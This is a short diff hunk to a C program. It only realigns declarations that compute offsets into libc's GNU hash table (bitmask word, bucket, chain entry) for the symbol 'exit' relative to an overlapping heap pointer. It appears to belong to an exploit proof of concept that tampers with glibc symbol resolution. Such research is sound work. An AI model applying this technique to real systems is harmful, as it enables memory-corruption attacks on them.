@@ -209,10 +209,10 @@ int main() {
 
     // uint64_t write_to_libc_offset	= (uint64_t)libc_base - (uint64_t)overlap_ptr;
     ptrdiff_t write_to_libc_offset  = DISTANCE(libc_base, overlap_ptr);
-    ptrdiff_t bitmask_word_offset	= BITMASK_OFFSET + ((NEW_HASH / 0x40) & 0xff) * 8;	// bitmask_word for "exit"
-    uint32_t bucket_index 		    = NEW_HASH % NBUCKETS;	// bucket index for "exit" (0xc4)
-    ptrdiff_t bucket_offset		    = BUCKETS_OFFSET + bucket_index * 4;	// bucket for "exit"
-    ptrdiff_t hasharr_offset		= CHAIN_ZERO_OFFSET + BUCKET * 4;	// hasharr[i] for "exit"
+    ptrdiff_t bitmask_word_offset   = BITMASK_OFFSET + ((NEW_HASH / 0x40) & 0xff) * 8;	// bitmask_word for "exit"
+    uint32_t bucket_index           = NEW_HASH % NBUCKETS;	// bucket index for "exit" (0xc4)
+    ptrdiff_t bucket_offset         = BUCKETS_OFFSET + bucket_index * 4;	// bucket for "exit"
+    ptrdiff_t hasharr_offset        = CHAIN_ZERO_OFFSET + BUCKET * 4;	// hasharr[i] for "exit"
         
     size_t bitmask_word_addr    = (size_t)overlap_ptr + write_to_libc_offset + bitmask_word_offset;
     size_t bucket_addr		    = (size_t)overlap_ptr + write_to_libc_offset + bucket_offset;
